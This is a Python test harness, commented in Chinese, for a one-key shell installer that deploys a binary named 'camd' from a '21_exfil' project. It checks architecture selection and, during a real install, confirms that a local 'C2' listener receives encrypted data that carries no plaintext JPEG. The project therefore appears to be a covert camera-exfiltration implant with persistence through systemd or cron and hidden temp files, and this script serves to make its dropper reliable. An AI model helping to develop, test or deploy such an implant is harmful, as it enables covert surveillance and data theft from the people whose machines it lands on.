#!/usr/bin/env python3
"""一键部署包的架构分发守卫。

为什么必须有这个守卫（本轮实测复现的缺陷）：

  把 e_machine=183(AArch64) 的产物装到 x86_64 机器上 ——
  ELF 魔数校验照样通过，"内嵌产物校验通过"、"二进制已安装" 全绿，
  退出码 0、计数"成功 7 失败 0"，而 camd 执行报 "Exec format error"。
  systemd 下配合 Restart=always 是无限重启循环，cron 下是静默不执行。
  部署者看到全绿，一帧画面都没有。

  根因：extract_bin 只校验 ELF 魔数（4 字节），而魔数只证明"是个 ELF"，
  证明不了"是这台机器能跑的 ELF"。

本守卫覆盖：
  正向(P)：多架构包按 uname -m 选节、e_machine 匹配、错架构必须拒且不留文件、
           构建期标错架构必须拒、真实安装后 C2 实收字节
  反向(R)：把修复退回（整段恢复旧 extract_bin），P 中"必须拒绝"的两条
           必须重新变成"放行"—— 证明这些断言不是恒绿

退出码：0 全过 / 1 有未过项 / 2 环境不具备（camd 缺失等）
"""
import os
import re
import shutil
import socket
import subprocess
import sys
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.abspath(os.path.join(HERE, "..", ".."))
EXFIL = os.path.join(ROOT, "21_exfil")
TEMPLATE = os.path.join(EXFIL, "onekey.sh")
GEN = os.path.join(EXFIL, "make_onekey.py")
CAMD = os.path.join(ROOT, "agent_windows", "build", "linux", "camd")
WORK = "/data/workspace/.okarch"

EM = {"amd64": 62, "arm64": 183, "386": 3, "arm": 40}
fails = []


def check(cond, name, detail=""):
    print("[%s] %s%s" % ("PASS" if cond else "FAIL", name,
                         ("  -- " + detail) if detail else ""))
    if not cond:
        fails.append(name)


def run(cmd, timeout=90, env=None, cwd=ROOT):
    e = dict(os.environ)
    if env:
        e.update(env)
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                           timeout=timeout, env=e, cwd=cwd)
        return p.returncode, p.stdout + p.stderr
    except subprocess.TimeoutExpired:
        return -99, "TIMEOUT"


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


class C2:
    """单进程内线程自闭环。后台独立进程持有 stdout 会让调用方挂起。"""

    def __init__(self, port):
        self.n = 0
        self.buf = b""
        self.s = socket.socket()
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind(("127.0.0.1", port))
        self.s.listen(8)
        threading.Thread(target=self._acc, daemon=True).start()

    def _serve(self, c):
        while True:
            try:
                b = c.recv(65536)
            except Exception:
                break
            if not b:
                break
            self.n += len(b)
            self.buf += b
        c.close()

    def _acc(self):
        while True:
            try:
                c, _ = self.s.accept()
            except Exception:
                return
            threading.Thread(target=self._serve, args=(c,), daemon=True).start()


def make_synthetic(path, arch):
    """把 camd 的 e_machine 改成目标架构值。

    注意：这只改 ELF 头的 2 个字节，产出的并**不是**真能在该架构上运行的
    程序。它的唯一用途是检验"架构识别"这条判据是否真的起作用——
    识别逻辑根本不看代码段，只看 ELF 头，所以头一致就足以验证判据。
    """
    blob = bytearray(open(CAMD, "rb").read())
    assert bytes(blob[:4]) == b"\x7fELF", "camd 不是 ELF"
    endian = "little" if blob[5] == 1 else "big"
    blob[18:20] = EM[arch].to_bytes(2, endian)
    open(path, "wb").write(bytes(blob))
    return path


def fake_uname(machine):
    d = os.path.join(WORK, "fake-" + machine)
    os.makedirs(d, exist_ok=True)
    p = os.path.join(d, "uname")
    with open(p, "w") as f:
        f.write('#!/bin/sh\nif [ "$1" = "-m" ]; then echo %s; '
                'else exec /usr/bin/uname "$@"; fi\n' % machine)
    os.chmod(p, 0o755)
    return d + ":" + os.environ["PATH"]


def gen_pkg(args, out):
    rc, outp = run("python3 %s %s -o %s" % (GEN, args, out))
    return rc, outp


def main():
    if not os.path.isfile(CAMD):
        print("[FATAL] camd 不存在: %s" % CAMD)
        sys.exit(2)
    shutil.rmtree(WORK, ignore_errors=True)
    os.makedirs(WORK, exist_ok=True)

    arm64 = make_synthetic(os.path.join(WORK, "camd_arm64"), "arm64")
    multi = os.path.join(WORK, "ok-multi.sh")
    only64 = os.path.join(WORK, "ok-amd64.sh")

    # ---------- 构建期 ----------
    rc, o = gen_pkg("amd64=%s arm64=%s" % (CAMD, arm64), multi)
    check(rc == 0, "P0 多架构包构建成功", o.strip().splitlines()[-1:] and
          o.strip().splitlines()[-1] or "")
    rc, o = gen_pkg("amd64=%s" % CAMD, only64)
    check(rc == 0, "P0b 单架构包构建成功")

    # 构建期：标签与产物 e_machine 不符必须拒（不靠 file(1) 字符串）
    rc, o = gen_pkg("arm64=%s" % CAMD, os.path.join(WORK, "bad.sh"))
    check(rc != 0 and "架构不符" in o,
          "P5 构建期标签与 e_machine 不符必须拒绝", "rc=%d" % rc)

    # ---------- P1/P2：按架构选节 ----------
    rc, o = run("sh %s checkpayload" % multi)
    check(rc == 0 and "ELF/amd64" in o and "e_machine=62" in o,
          "P1 x86_64 目标机选中 amd64 分节且 e_machine 匹配", "rc=%d" % rc)

    rc, o = run("sh %s checkpayload" % multi, env={"PATH": fake_uname("aarch64")})
    check(rc == 0 and "ELF/arm64" in o and "e_machine=183" in o,
          "P2 aarch64 目标机选中 arm64 分节且 e_machine 匹配", "rc=%d" % rc)

    # ---------- P3：包里没有该架构分节 ----------
    run("sh %s uninstall" % only64)
    rc, o = run("sh %s checkpayload" % only64, env={"PATH": fake_uname("aarch64")})
    left = os.path.exists("/usr/local/bin/camd") or os.path.isdir("/etc/camd")
    check(rc != 0 and "没有" in o and "分节" in o,
          "P3 缺架构分节时必须拒绝（不得装错架构产物）", "rc=%d" % rc)
    check(not left, "P4 被拒绝后不得留下已安装文件", "残留=%s" % left)

    # ---------- P6：真实安装 + C2 实收 ----------
    run("sh %s uninstall" % multi)
    port = free_port()
    c2 = C2(port)
    time.sleep(0.3)
    rc, o = run("sh %s install --c2 127.0.0.1:%d --backend mock" % (multi, port),
                timeout=120)
    time.sleep(1.0)
    check(c2.n > 0, "P6 安装后 C2 真实收到信元", "实收=%d rc=%d" % (c2.n, rc))
    check(b"\xff\xd8\xff" not in c2.buf, "P7 线上不含 JPEG 明文",
          "字节种类=%d" % len(set(c2.buf)))
    run("sh %s uninstall" % multi)

    # ---------- 反向：整段退回旧 extract_bin ----------
    # 旧行为只校验 ELF 魔数。退回后 P3 必须重新"放行"——
    # 若此时 P3 仍然红，说明它红的原因不是本修复，断言是假的。
    src = open(TEMPLATE).read()
    m = re.search(r"extract_bin\(\) \{.*?\n\}\n", src, re.S)
    if not m:
        check(False, "R0 未能定位 extract_bin 以做反向注入")
    else:
        old = ('extract_bin() {\n'
               '    TMPB=$(mktemp /tmp/.x-XXXXXX 2>/dev/null) || TMPB=/tmp/.x-$$\n'
               '    awk \'/^# PAYLOAD_BEGIN$/{f=1;next} /^# PAYLOAD_END$/{f=0} f\' "$0" \\\n'
               '        | base64 -d > "$TMPB" 2>/dev/null\n'
               '    MAGIC=$(od -An -tx1 -N4 "$TMPB" 2>/dev/null | tr -d \' \\n\')\n'
               '    [ "$MAGIC" = "7f454c46" ] || DIE "stub"\n'
               '    OK "内嵌产物校验通过"\n'
               '    return 0\n'
               '}\n')
        mut_dir = os.path.join(WORK, "mut")
        os.makedirs(mut_dir, exist_ok=True)
        shutil.copy(TEMPLATE, os.path.join(mut_dir, "onekey.sh"))
        shutil.copy(GEN, os.path.join(mut_dir, "make_onekey.py"))
        mt = os.path.join(mut_dir, "onekey.sh")
        open(mt, "w").write(src[:m.start()] + old + src[m.end():])
        bad = os.path.join(WORK, "ok-mut.sh")
        rc, o = run("python3 %s amd64=%s -o %s" % (os.path.join(mut_dir, "make_onekey.py"), CAMD, bad))
        # 变异模板的旧 extract_bin 只认裸标记，而新生成器产出带标签分节，
        # 直接跑会因为"解码为空"而拒绝——那是另一种失败，不是旧行为。
        # 必须把标签剥掉还原成旧格式，才能真正重现"只校验魔数"的旧行为。
        leg = os.path.join(WORK, "ok-mut-legacy.sh")
        run("sed 's/^# PAYLOAD_BEGIN amd64$/# PAYLOAD_BEGIN/; "
            "s/^# PAYLOAD_END amd64$/# PAYLOAD_END/' %s > %s" % (bad, leg))
        rc2, o2 = run("sh %s checkpayload" % leg, env={"PATH": fake_uname("aarch64")})
        check(rc2 == 0, "R1 退回旧实现后错架构被放行（假成功）",
              "rc=%d 输出=%s" % (rc2, (o2.strip().splitlines() or [""])[-1]))
        # 对照：同一份裸标记包，用当前（已修）模板必须拒绝。
        leg2 = os.path.join(WORK, "ok-cur-legacy.sh")
        run("sed 's/^# PAYLOAD_BEGIN amd64$/# PAYLOAD_BEGIN/; "
            "s/^# PAYLOAD_END amd64$/# PAYLOAD_END/' %s > %s" % (only64, leg2))
        rc3, o3 = run("sh %s checkpayload" % leg2, env={"PATH": fake_uname("aarch64")})
        check(rc3 != 0, "R2 同一份包在当前实现下必须拒绝（R1 的对照）",
              "rc=%d" % rc3)

    print("=" * 60)
    if fails:
        print("[FAIL] %d 项未通过: %s" % (len(fails), fails))
        sys.exit(1)
    print("[PASS] 全部通过  EXIT=0")


if __name__ == "__main__":
    main()
